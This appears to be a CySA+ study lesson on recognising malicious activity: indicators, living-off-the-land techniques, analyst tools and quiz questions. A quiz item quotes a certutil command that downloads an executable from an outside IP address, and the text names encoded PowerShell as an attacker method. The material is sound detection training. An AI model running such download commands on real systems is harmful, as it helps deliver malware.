Lesson 10: Analyzing Malicious Activity

CompTIA CySA+ (CS0-004)

Overview

This lesson is the core analyst skill: looking at network traffic, hosts, applications, cloud accounts and email, recognising what is malicious, and using the right tool to confirm it.

You will learn:

  • network, host, application, cloud, identity and email indicators of malicious activity;
  • living-off-the-land attacks that abuse built-in tools;
  • the analyst toolbox: packet analysis, SIEM, EDR, reputation lookups, file analysis and sandboxes.

On the exam this is mostly objectives 1.2 (indicators of potential malicious activity) and 1.3 (tools to determine malicious activity).

Step 3: Key ideas to remember

Indicators to recognise

WhereIndicators
NetworkRogue devices, scanning and enumeration, regular "beaconing" to one outside address, traffic on unexpected ports, large outbound transfers
HostHigh CPU or memory use, unauthorized software, suspicious or misnamed processes, new scheduled tasks or services, file system changes, unauthorized configuration changes
ApplicationService crashes or outages, unusual errors, new accounts inside the app
CloudUnexpected new resources (often cryptomining), unusual API calls, settings changed to public
Social engineeringTyposquatted domains (micros0ft.com), shortened URLs hiding the real destination
Identity and emailImpossible travel, account compromise, business email compromise (BEC): a convincing request to change bank details or pay an invoice, often with no malware at all

Living off the land

Attackers use tools already on the system so nothing new is installed: powershell.exe -enc (an encoded command), certutil -urlcache to download files, rundll32, wmic, scheduled tasks. These are LOLBins (living-off-the-land binaries). Spot them by how they are used and by unusual parent processes, for example Word starting PowerShell.

The analyst toolbox

  • Packet analysis: Wireshark, tcpdump, Zeek; intrusion detection with Snort and Suricata.
  • Log analysis: the SIEM (Splunk, Elastic). Endpoint: EDR and XDR, and MDM for mobile devices.
  • Reputation and intelligence: WHOIS, AbuseIPDB, IP geolocation, VirusTotal, threat-intelligence platforms (OTX, MISP, OpenCTI).
  • File analysis: strings, YARA rules, sandboxes (Joe Sandbox, Cuckoo) that run the file safely and record what it does.
  • Email: header analysis and MXToolbox (check SPF, DKIM and DMARC results and the real sending server). User behaviour: UEBA spots accounts acting unlike themselves.

Check your understanding

EDR shows certutil.exe -urlcache -f http://203.0.113.5/a.exe. What is happening?

Certutil is a legitimate certificate tool, but downloading an executable from a bare IP address is a classic LOLBin technique.

The CFO receives an email, apparently from the CEO, urgently asking for a wire transfer. It has no attachment or link. What is the likely attack?

BEC relies on impersonation and urgency, not malware. Check the headers and reply-to address, and confirm the request by phone.

You need to check whether an unknown file is known malware without running it on your workstation. What is a good first step?

A hash lookup reveals known-bad files without sharing the file's contents. Unknown files can then go to a sandbox. Don't upload sensitive company documents to public services.
